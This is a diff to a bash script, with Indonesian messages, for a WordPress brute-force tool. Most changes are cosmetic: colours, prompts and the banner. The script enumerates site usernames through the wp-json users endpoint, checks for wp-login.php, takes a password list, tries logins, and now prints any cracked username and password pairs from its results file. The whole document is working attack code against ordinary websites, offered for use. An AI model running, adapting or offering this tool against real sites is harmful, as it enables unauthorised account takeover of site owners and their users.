@@ -12,9 +12,8 @@ fi
 
 RED='\e[31m'
 GRN='\e[32m'
-CYN='\e[33m'
+CYN='\e[36m'
 CLR='\e[0m'
-CYN='\e[0;36m'
 
 # Pindah ke virtual terminal agar tampilan lebih fokus
 echo -e "\e[8;40;100t"
@@ -25,7 +24,7 @@ function _GetUserWPJSON() {
     UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-json/wp/v2/users" | grep -Po '"slug":"\K.*?(?=")')
     echo ""
     if [[ -z ${UsernameLists} ]]; then
-        echo -e "${CYN}INFO: Cannot detect Username!${CLR}"
+        echo -e "${RED}INFO: Cannot detect Username!${CLR}"
     else
         echo -ne > wpusername.tmp
         for Username in ${UsernameLists}; do
@@ -50,7 +49,6 @@ function _TestLogin() {
 
 # Print Banner
 echo -e "\x1b[1;96m
-
                    __        ______                            
                   \ \      / /  _ \                           
                    \ \ /\ / /| |_) |                          
@@ -59,25 +57,20 @@ echo -e "\x1b[1;96m
  | __ )|  _ \| | | |_   _| ____|  ___/ _ \|  _ \ / ___| ____| 
  |  _ \| |_) | | | | | | |  _| | |_ | | | | |_) | |   |  _|   
  | |_) |  _ <| |_| | | | | |___|  _|| |_| |  _ <| |___| |___  
- |____/|_| \_\\___/  |__| |_____|_|   \___/|_| \_\\____|_____| 
-
-
-
-     https://target.com/wp-login.php
-     ? = pass.txt
-     ? = admin
+ |____/|_| \_\\___/  |_|_| |_____|_|  \___/|_| \_\\_____|_____| 
+                                             
 "
 
-echo -ne "[?] Input website target : \x1b[1;97m"
+echo -ne "[?] Input website target > \x1b[1;97m"
 read Target
 
 curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
 if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]]; then
-    echo -e "${RED}ERROR: Invalid wordpress wp-login!${CLR}"
+    echo -e "${RED}ERROR: Invalid WordPress wp-login!${CLR}"
     exit
 fi
 
-echo -ne "[?] Input password list : \x1b[1;97m"
+echo -ne "[?] Input password > \x1b[1;97m"
 read -a PasswordLists
 
 _GetUserWPJSON ${Target}
@@ -93,12 +86,12 @@ if [[ -s wpusername.tmp ]]; then
         )
     done
 else
-    echo -e "${RED}user sesuai terget${CLR}"
-    echo -ne "[?] Input username  : \x1b[1;97m"
+    echo -e "${RED}user sesuai target${CLR}"
+    echo -ne "[?] Input username > \x1b[1;97m"
     read User
 
     if [[ -z ${User} ]]; then
-        echo -e "${RED}ERROR: Username cannot be empty!${CLR}"
+        echo -e "${RED}user target nya salah ya :(${CLR}"
         exit
     fi
     echo ''
@@ -111,4 +104,10 @@ else
     )
 fi
 
-echo "INFO: Found $(grep -c ${Target} wpbf-results.txt) username & password in ./wpbf-results.txt"
+found_count=$(grep -c ${Target} wpbf-results.txt)
+if [[ ${found_count} -gt 0 ]]; then
+    echo -e "${GRN}INFO: Found ${found_count} username & password in ./wpbf-results.txt${CLR}"
+    cat wpbf-results.txt
+else
+    echo -e "${RED}INFO: yha target yang anda cari kosong${CLR}"
+fi
